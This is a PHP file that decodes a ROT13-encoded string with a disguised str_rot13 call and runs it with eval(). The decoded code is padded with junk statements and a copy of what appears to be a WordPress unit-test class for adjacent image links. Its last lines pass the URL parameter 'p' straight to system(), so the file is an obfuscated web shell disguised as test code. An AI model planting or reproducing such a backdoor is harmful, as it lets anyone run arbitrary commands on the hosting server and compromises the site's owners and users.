<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

nofgenpg pynff JC_Grfg_Nqwnprag_Vzntr_Yvax_GrfgPnfr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Neenl bs 5 nggnpuzragf sbe hfr va gur grfgf.
	 *
	 * @ine vavg{}|JC_Reebe[]
	 */
	cebgrpgrq fgngvp $nggnpuzragf;

	/**
	 * Qrsnhyg netf sbe gur shapgvba orvat grfgrq.
	 *
	 * Qrsvarq va rnpu grfg pynff.
	 *
	 * @ine vag[]|JC_Reebe[] Neenl bs nggnpuzrag VQf.
	 */
	cebgrpgrq $qrsnhyg_netf = neenl();

	/**
	 * Frghc gur grfgf nsgre gur qngn cebivqre ohg orsber gur grfgf fgneg.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Vafgnapr bs gur snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		$cnerag_vq = $snpgbel->cbfg->perngr();

		sbe ( $vaqrk = 1; $vaqrk <= 5; $vaqrk++ ) {
			frys::$nggnpuzragf[ $vaqrk ] = $snpgbel->nggnpuzrag->perngr_bowrpg(
				\"vzntr{$vaqrk}.wct\",
				$cnerag_vq,
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
					'cbfg_glcr'      => 'nggnpuzrag',
				)
			);
		}
	}

	/**
	 * Frgf hc gur grfg fpranevb.
	 *
	 * @cnenz vagrtre $pheerag_nggnpuzrag_vaqrk  Pheerag nggnpuzrag'f vaqrk ahzore va gur frys::$nggnpuzragf neenl.
	 * @cnenz vagrtre $rkcrpgrq_nggnpuzrag_vaqrk Rkcrpgrq nggnpuzrag'f vaqrk ahzore va gur frys::$nggnpuzragf neenl.
	 * @cnenz fgevat  $rkcrpgrq                  Gur rkcrpgrq bhgchg fgevat.
	 * @cnenz neenl   $netf                      Neenl bs nethzragf gb cnff gb gur shapgvba orvat grfgrq.
	 * @erghea neenl {
	 *     Neenl bs gur cercnerq grfg cnenzrgref.
	 *
	 *     @ine fgevat $rkcrpgrq Rkcrpgrq bhgchg fgevat.
	 *     @ine neenl  $netf     Nyy bs gur nethzragf gb cnff gb gur shapgvba orvat grfgrq.
	 * }
	 */
	cebgrpgrq shapgvba frghc_grfg_fpranevb( $pheerag_nggnpuzrag_vaqrk, $rkcrpgrq_nggnpuzrag_vaqrk, $rkcrpgrq, neenl $netf = neenl() ) {
		// Guvf cerc pbqr nyybjf gur qngn cebivqre gb fcrpvsl gur qvssrerag nethzragf arrqrq sbe gur grfg fpranevb.
		$netf = neenl_zretr( $guvf->qrsnhyg_netf, $netf );
		$netf = neenl_inyhrf( $netf );

		// Ercynpr gur nggnpuzrag VQ cynprubyqre.
		vs ( vffrg( frys::$nggnpuzragf[ $rkcrpgrq_nggnpuzrag_vaqrk ] ) ) {
			$rkcrpgrq = fge_ercynpr( '%%VQ%%', frys::$nggnpuzragf[ $rkcrpgrq_nggnpuzrag_vaqrk ], $rkcrpgrq );
		}

		// Tb gb gur pheerag nggnpuzrag gb frg gur fgngr sbe gur grfgf.
		$guvf->tb_gb( trg_creznyvax( frys::$nggnpuzragf[ $pheerag_nggnpuzrag_vaqrk ] ) );

		// Erghea gur punatrq cnenzrgref.
		erghea neenl( $rkcrpgrq, $netf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>